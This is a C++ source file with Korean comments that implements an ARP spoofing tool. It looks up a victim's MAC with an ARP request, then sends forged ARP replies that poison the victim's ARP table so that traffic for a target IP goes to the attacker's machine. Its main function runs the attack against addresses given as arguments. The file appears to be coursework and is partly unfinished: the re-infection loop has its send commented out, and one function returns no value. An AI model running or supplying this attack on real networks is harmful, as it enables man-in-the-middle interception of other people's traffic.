
#include "send_arp.h"



/*
 *
 * 생성자 
 * 전송할 IP를 설정하고, PcapManager를 설정한다. 
 * 인터페이스는 자신의 MAC과 IP를 얻기 위해 이용
 * 
*/
SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP, PcapManager *pcapManager)
{
    this->interface = interface;
    this->senderIP = senderIP;
    this->targetIP = targetIP;

    this ->pcapManager = pcapManager;

    //내 MAC, IP 주소 설정
    SetMyAddr(interface);
    
} //SendARP::SendARP(uint8_t * interface, uint32_t senderIP, uint32_t targetIP)


/*
 *
 * 내 IP와 MAC 주소를 얻음
 * 
*/
void SendARP::SetMyAddr(uint8_t * interface)
{

    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, (char *)interface);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
    {
        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
    }
    else
    {
        printf("Fail to get my MAC address!\n");
        exit(1);
    }

    s.ifr_addr.sa_family = AF_INET;

    if (0 == ioctl(fd, SIOCGIFADDR, &s))
    {
        myIP = (uint32_t)(((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr);

    }
    else
    {
        printf("Fail to get my IP address!\n");
        exit(1);

    }

    close(fd);

} //void SetMyMAC(uint8_t * interface)



/*
 *
 * ARP패킷을 생성한다
 * 인자로 준 요구사항에 맞는 패킷을 생성
 * 
*/
bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
{

    uint8_t requestMAC[ETH_ALEN];

    switch(arpType)
    {
    case ARPOP_REQUEST: 
       
        //ethernet header for broadcast
        memset(requestMAC, 0xFF, sizeof(requestMAC));
        MakeEtherHeader( &(buf->eth), requestMAC, srcMAC);

        //ARP dstMAC for request
        memset(requestMAC, 0x00, sizeof(requestMAC));
        dstMAC = requestMAC;
        
        break;

    case ARPOP_REPLY:

        MakeEtherHeader( &(buf->eth), dstMAC, srcMAC); 
    
        break;

    } // switch(arpType)

    //header
    buf->arp.hardType  = htons(ARPHRD_ETHER);
    buf->arp.protoType = htons(ETHERTYPE_IP);
    buf->arp.hardLen = ETH_ALEN;
    buf->arp.protoLen = (uint8_t)LEN::IPADDRLEN;
    buf->arp.opcode = htons(arpType); 

    //내용
    memcpy((char *) buf->arp.srcMAC, (char * )srcMAC, ETH_ALEN);
    buf->arp.srcIP = srcIP;
    memcpy((char *) buf->arp.dstMAC, (char * )dstMAC, ETH_ALEN);
    buf->arp.dstIP = dstIP;

} //bool SendARP::MakeARP(uint8_t arpType, ARPPACKET *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)


/*
 *
 * 이더넷 헤더를 제작
 * 
 * 
*/
void SendARP::MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
{
    memcpy((char *)eth->ether_dhost, (char*) dstMAC, ETH_ALEN);
    memcpy((char *)eth->ether_shost, (char*) srcMAC, ETH_ALEN);    
    eth->ether_type = htons(ETHERTYPE_ARP);

} //void SendARP::MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)




/*
 *
 * ARP 테이블을 오염시킨다
 * 
*/
bool SendARP::InfectARPTable()
{

    uint8_t errbuf[PCAP_ERRBUF_SIZE];

    char print_senderIP[20];
    char print_targetIP[20];
    inet_ntop(AF_INET, (const void *)&senderIP, print_senderIP, sizeof(print_senderIP));
    inet_ntop(AF_INET, (const void *)&targetIP, print_targetIP, sizeof(print_targetIP));


    if(isBuilt)
    {
        pcapManager->Send((uint8_t *)&buf, (int32_t)LEN::PACKETLEN);
        return false;
    }

    SetMyAddr(interface);

    //--- get sender's MAC ---
    
    MakeARP(ARPOP_REQUEST, &buf, NULL, myMAC, senderIP, myIP);
     
    //get response
    bool getResponse = false;
    
    pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);

    GetSenderMAC();

    //___ get sender's MAC ___
   

    //--- infect ARP Table ---

    memset(&buf, 0, sizeof(buf));

    MakeARP(ARPOP_REPLY, &buf, senderMAC, myMAC, senderIP, targetIP);
    

    printf("infect ARP table : sender [%s] target [%s]\n", print_senderIP, print_targetIP);
    
    //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
    pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
    //___ infect ARP Table ___
    isBuilt =  true;
    return true;

}


bool SendARP::MaintainInfection()
{

    struct timeval tv;
    gettimeofday (&tv, NULL);
    long oldTime= (tv.tv_sec * 1000);


    if(!isBuilt)
        return false;
    

    //주기적으로 패킷 전송
    while(true)   
    {
        gettimeofday (&tv, NULL);
        long passedTime = (tv.tv_sec *1000 -oldTime) /1000;
        
        if(passedTime >5 || passedTime <0)
        {
         //    pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
        }


    }



}


void SendARP::SetSenderMAC(uint8_t * sMAC)
{
    memcpy(senderMAC, sMAC, ETH_ALEN);
    gotSenderMAC = true;

}


bool SendARP::GetSenderMAC()
{
    //구독 신청
    Subscriber * sub = new Subscriber(NULL, 
                                     (uint8_t * )myMAC, 
                                     senderIP,
                                     0, 
                                     NULL, 
                                     NULL,
                                     (uint32_t)SUBTYPE::GETSENDERMAC, 
                                     (void *)this, 
                                     ETHERTYPE_ARP);

    pcapManager->AddSubscriber(sub);

    ARPPACKET * arpPacket = (ARPPACKET * )packet;

    while (!gotSenderMAC) 
    {
        sleep(5);
        pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
    }

    return true;

} //bool SendARP::GetSenderMAC(ARPPACKET * packet)


int main(int argc, char * argv[])
{
   
       PcapManager mng((uint8_t *)"eth0");
    SendARP a( (uint8_t *)argv[1], (uint32_t)inet_addr(argv[2]), (uint32_t)inet_addr(argv[3]), &mng);

    a.InfectARPTable();
 
}
